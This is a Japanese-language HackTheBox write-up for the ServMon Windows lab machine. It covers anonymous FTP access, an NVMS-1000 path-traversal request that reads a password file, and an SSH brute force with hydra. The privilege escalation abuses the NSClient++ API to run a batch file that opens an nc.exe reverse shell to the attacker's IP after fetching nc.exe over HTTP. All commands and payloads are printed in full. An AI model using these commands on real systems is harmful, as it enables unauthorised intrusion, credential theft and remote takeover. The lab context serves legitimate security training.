+++
title = "HackTheBox - ServMon Writeup"
date = "2026-04-26"
description = "FTP匿名ログイン → NVMS-1000 LFI → SSH → NSClient++ 権限昇格"
tags = ["HackTheBox", "CTF", "Windows", "LFI", "NSClient++", "Easy"]
categories = ["HackTheBox"]
toc = true
draft = false
+++

## Machine Info

| Field | Details |
|-------|---------|
| Machine | ServMon |
| OS | Windows |
| Difficulty | Easy |
| IP | 10.129.227.77 |

---

## Reconnaissance

### Nmap Scan

```bash
nmap -sV 10.129.227.77
```

```text
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
22/tcp   open  ssh           OpenSSH for_Windows_8.0 (protocol 2.0)
80/tcp   open  http
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
5666/tcp open  tcpwrapped
6699/tcp open  napster?
8443/tcp open  ssl/https-alt
```

---

## FTP 匿名ログイン

```bash
ftp 10.129.227.77
# Name: anonymous
# Password: anonymous
```

```text
ftp> cd Users/Nadine
ftp> get Confidential.txt

ftp> cd ../Nathan
ftp> get "Notes to do.txt"
```

Confidential.txt の内容:

```text
Nathan,
I left your Passwords.txt file on your Desktop. Please remove this once you 
have edited it yourself and place it back into the secure folder.
Regards
Nadine
```

Notes to do.txt の内容:

```text
1) Change the password for NVMS - Complete
2) Lock down the NSClient Access - Complete
3) Upload the passwords
4) Remove public access to NVMS
5) Place the secret files in SharePoint
```

`C:\Users\Nathan\Desktop\Passwords.txt` にパスワードリストが存在することが判明。

---

## NVMS-1000 LFI でパスワード取得

ポート 80 で動作する NVMS-1000 にディレクトリトラバーサル脆弱性が存在する（EDB-47774）。

```bash
curl -s --path-as-is "http://10.129.227.77/../../../../../../../../Users/Nathan/Desktop/Passwords.txt"
```

```text
1nsp3ctTh3Way2Mars!
Th3r34r3To0M4nyTrait0r5!
B3WithM30r4ga1n5tMe
L1k3B1gBut7s@W0rk
0nly7h3y0unGWi11F0l10w
IfH3s4b0Utg0t0H1sH0me
Gr4etN3w5w17hMySk1Pa5$
```

---

## SSH ブルートフォース

```bash
hydra -L user.txt -P password.txt 10.129.227.77 ssh
```

```text
[22][ssh] host: 10.129.227.77   login: Nadine   password: L1k3B1gBut7s@W0rk
```

---

## Foothold

```bash
ssh Nadine@10.129.227.77
```

```text
nadine@SERVMON C:\Users\Nadine>
```

---

## User Flag

```cmd
type C:\Users\Nadine\Desktop\user.txt
```

---

## Post Exploitation

NSClient++ のバージョン確認:

```cmd
"C:\Program Files\NSClient++\nscp.exe" --version
```

```text
NSClient++, Version: 0.5.2.35 2018-01-28, Platform: x64
```

searchsploit で脆弱性を確認:

```bash
searchsploit nsclient
```

```text
NSClient++ 0.5.2.35 - Privilege Escalation      | windows/local/46802.txt
NSClient++ 0.5.2.35 - Authenticated Remote Code Execution | json/webapps/48360.txt
```

nsclient.ini からパスワードを取得:

```cmd
type "C:\Program Files\NSClient++\nsclient.ini"
```

```text
password = ew2x6SsGTxjRwXOT
allowed hosts = 127.0.0.1
```

---

## Privilege Escalation

### evil.bat を作成

```cmd
echo @echo off > C:\Users\Nadine\Desktop\evil.bat
echo C:\Users\Nadine\Desktop\nc.exe 10.10.16.166 443 -e cmd.exe >> C:\Users\Nadine\Desktop\evil.bat
```

### nc.exe を転送

```bash
# Kali 側
cp /usr/share/windows-resources/binaries/nc.exe ~/Downloads/windows/nc.exe
cd ~/Downloads/windows
python3 -m http.server 9090
```

```cmd
# ServMon 側
curl http://10.10.16.166:9090/nc.exe -o C:\Users\Nadine\Desktop\nc.exe
```

### SSH トンネルを張る

```bash
ssh -L 8443:127.0.0.1:8443 nadine@10.129.227.77
```

### リスナーを起動

```bash
nc -nlvvp 443
```

### NSClient++ API でスクリプトを登録・実行

```bash
# トークン取得
TOKEN=$(curl -s -k "https://127.0.0.1:8443/auth/token?password=ew2x6SsGTxjRwXOT" | python3 -c "import sys,json;print(json.load(sys.stdin)['auth token'])")

# スクリプト登録
curl -s -k -X POST "https://127.0.0.1:8443/settings/query.json" \
  -H "TOKEN: $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"type":"SettingsRequestMessage","payload":[{"plugin_id":"1234","update":{"node":{"path":"/settings/external scripts/scripts","key":"evil"},"value":{"string_data":"C:\\Users\\Nadine\\Desktop\\evil.bat"}}}]}'

# 設定保存
curl -s -k -X POST "https://127.0.0.1:8443/settings/query.json" \
  -H "TOKEN: $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"header":{"version":"1"},"type":"SettingsRequestMessage","payload":[{"plugin_id":"1234","control":{"command":"SAVE"}}]}'

# リロード
curl -s -k "https://127.0.0.1:8443/core/reload" -H "TOKEN: $TOKEN"

# 新トークン取得してスクリプト実行
sleep 30
TOKEN=$(curl -s -k "https://127.0.0.1:8443/auth/token?password=ew2x6SsGTxjRwXOT" | python3 -c "import sys,json;print(json.load(sys.stdin)['auth token'])")
curl -s -k "https://127.0.0.1:8443/query/evil" -H "TOKEN: $TOKEN"
```

---

## SYSTEM Shell

```text
connect to [10.10.16.166] from (UNKNOWN) [10.129.227.77] 49721

C:\Program Files\NSClient++>whoami
nt authority\system
```

---

## Flags

### User

```cmd
type C:\Users\Nadine\Desktop\user.txt
```

### Root

```cmd
type C:\Users\Administrator\Desktop\root.txt
```

---

## Summary

FTP Anonymous Login → NVMS-1000 LFI でパスワード取得 → SSH (Nadine) → NSClient++ 0.5.2.35 権限昇格 → NT AUTHORITY\SYSTEM
